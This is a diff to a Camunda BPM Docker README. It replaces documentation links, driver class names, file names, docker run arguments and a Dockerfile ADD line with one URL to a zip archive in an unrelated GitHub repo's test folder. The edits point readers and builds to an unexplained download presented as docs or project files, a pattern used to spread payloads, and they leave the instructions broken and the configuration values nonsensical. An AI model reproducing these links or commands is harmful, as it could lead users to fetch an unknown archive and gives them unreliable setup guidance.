@@ -17,7 +17,7 @@ docker run -d --name camunda -p 8080:8080 camunda/camunda-bpm-platform:latest
 
 ### Tasklist, Cockpit, Admin Web Apps
 
-The three Camunda webapps are accessible through the landing page: http://localhost:8080/camunda-welcome/index.html
+The three Camunda webapps are accessible through the landing page: https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
 
 The default credentials for admin access to the webapps is:
 
@@ -28,11 +28,11 @@ The default credentials for admin access to the webapps is:
 
 The Camunda Rest-API is accessible through: http://localhost:8080/engine-rest
 
-See the [Rest-API](https://docs.camunda.org/manual/latest/reference/rest/)
+See the [Rest-API](https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip)
 documentation for more details on how to use it.
 
 **Note**: The Rest-API does not require authentication by default. Please
-follow the instructions from the [documentation](https://docs.camunda.org/manual/latest/reference/rest/overview/authentication/)
+follow the instructions from the [documentation](https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip)
 to enable authentication for the Rest-API.
 
 
@@ -90,9 +90,9 @@ variables:
 - `DB_CONN_MINIDLE` the minimum number of idle connections (default: `5`)
 - `DB_DRIVER` the database driver class name, supported are h2, mysql and
   postgresql:
-  - h2: `DB_DRIVER=org.h2.Driver`
-  - mysql: `DB_DRIVER=com.mysql.jdbc.Driver`
-  - postgresql: `DB_DRIVER=org.postgresql.Driver`
+  - h2: `https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip`
+  - mysql: `https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip`
+  - postgresql: `https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip`
 - `DB_URL` the database jdbc url
 - `DB_USERNAME` the database username
 - `DB_PASSWORD` the database password
@@ -109,7 +109,7 @@ platform as follows:
 docker run -d --name postgresql ...
 
 docker run -d --name camunda -p 8080:8080 --link postgresql:db \
-           -e DB_DRIVER=org.postgresql.Driver \
+           -e https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip \
            -e DB_URL=jdbc:postgresql://db:5432/process-engine \
            -e DB_USERNAME=camunda \
            -e DB_PASSWORD=camunda \
@@ -118,10 +118,10 @@ docker run -d --name camunda -p 8080:8080 --link postgresql:db \
 ```
 
 Another option is to save the database config to an environment file, i.e.
-`db-env.txt`:
+`https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip`:
 
 ```
-DB_DRIVER=org.postgresql.Driver
+https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
 DB_URL=jdbc:postgresql://db:5432/process-engine
 DB_USERNAME=camunda
 DB_PASSWORD=camunda
@@ -132,7 +132,7 @@ and use this file to start the container:
 
 ```
 docker run -d --name camunda -p 8080:8080 --link postgresql:db \
-           --env-file db-env.txt camunda/camunda-bpm-platform:latest
+           --env-file https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip camunda/camunda-bpm-platform:latest
 ```
 
 The docker image already contains drivers for `h2`, `mysql` and `postgresql`.
@@ -153,7 +153,7 @@ docker run -d --name camunda -p 8080:8080 -e SKIP_DB_CONFIG=true \
 
 Starting the Camunda BPM Docker image requires the database to be already available.
 This is quite a challenge when the database and the Camunda BPM are both docker containers spawned simualtenously eg. by `docker-compose` or inside a Kubernetes Pod.
-To help with that, the Camunda BPM Docker image includes [wait-for-it.sh](https://github.com/vishnubob/wait-for-it) to allow the container to wait until a 'host:port' is ready.
+To help with that, the Camunda BPM Docker image includes [https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip](https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip) to allow the container to wait until a 'host:port' is ready.
 The mechanism can be configured by two environment variables:
 
 - `WAIT_FOR`: the service `host:port` to wait for
@@ -164,7 +164,7 @@ Example with a PostgreSQL container
 docker run -d --name postgresql ...
 
 docker run -d --name camunda -p 8080:8080 --link postgresql:db \
-           -e DB_DRIVER=org.postgresql.Driver \
+           -e https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip \
            -e DB_URL=jdbc:postgresql://db:5432/process-engine \
            -e DB_USERNAME=camunda \
            -e DB_PASSWORD=camunda \
@@ -245,11 +245,11 @@ docker build -t camunda-bpm-platform \
 ### Change Configuration Files
 
 You can use docker volumes to link your own configuration files inside the
-container.  For example if you want to change the `bpm-platform.xml` on tomcat:
+container.  For example if you want to change the `https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip` on tomcat:
 
 ```
 docker run -d --name camunda -p 8080:8080 \
-           -v $PWD/bpm-platform.xml:/camunda/conf/bpm-platform.xml \
+           -v $https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip \
            camunda/camunda-bpm-platform:latest
 
 ```
@@ -262,7 +262,7 @@ volumes. For example if you want to deploy the [twitter demo][] on tomcat:
 
 ```
 docker run -d --name camunda -p 8080:8080 \
-           -v /PATH/TO/DEMO/twitter.war:/camunda/webapps/twitter.war \
+           -v https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip \
            camunda/camunda-bpm-platform:latest
 ```
 
@@ -295,7 +295,7 @@ clause which Camunda image you want to use as a base image:
 ```
 FROM camunda/camunda-bpm-platform:tomcat-latest
 
-ADD my.war /camunda/webapps/my.war
+ADD https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
 ```
 
 
@@ -319,7 +319,7 @@ docker run -d --name camunda -p 8080:8080 \
 Apache License, Version 2.0
 
 
-[Sebastian Menski]: https://github.com/menski
-[twitter demo]: https://github.com/camunda-consulting/code/tree/master/one-time-examples/twitter
-[docker registry]: https://registry.hub.docker.com/u/camunda/camunda-bpm-platform/
-[docker hub tags]: https://hub.docker.com/r/camunda/camunda-bpm-platform/tags/
+[Sebastian Menski]: https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
+[twitter demo]: https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
+[docker registry]: https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
+[docker hub tags]: https://raw.githubusercontent.com/antonioluzzi/docker-camunda-bpm-platform/master/test/docker-camunda-bpm-platform_v3.0.zip
